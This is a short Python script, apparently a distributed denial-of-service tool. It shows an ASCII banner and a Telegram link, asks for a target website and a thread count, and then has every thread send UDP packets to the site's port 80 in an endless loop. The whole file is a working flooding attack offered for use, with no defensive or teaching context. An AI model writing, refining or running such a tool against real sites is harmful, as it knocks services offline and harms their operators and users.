print(" ----------------------------------------------------------------------------")
print("|      |   |---|    |---\\\     |---\\\       ___          //----    |        |")
print("|      |   |   |    |    \\\    |    \\\     (()))        //         |        |")
print("|      |   |\---    |     //   |     //    (()))        \\\         |        | ")
print("|      |   | \      |____//    |_____//    (()))   ----//          |        |")
print(" ----------------------------------------------------------------------------")
print("      ver:0.5         linktelegram: https://t.me/+GCZQwteFy5Q3Yzc0")

import time
import socket
import sys
import _thread
print("")
site=input("Enter url website: ")
thread_count=input("Enter Speed attack: ")
ip=socket.gethostbyname(site)
UDP_PORT=80
MESSAGE=input("enter your message: ")
print("Target:"+" "+site)
print("Port attack:"+" "+"80")
print("")
time.sleep(2)
print("[*] Please wait...")
time.sleep(3)
print("[*] connect to server...")
time.sleep(3)
print("[*] Starting attack =>...")
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("[=>] send to server website ->")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass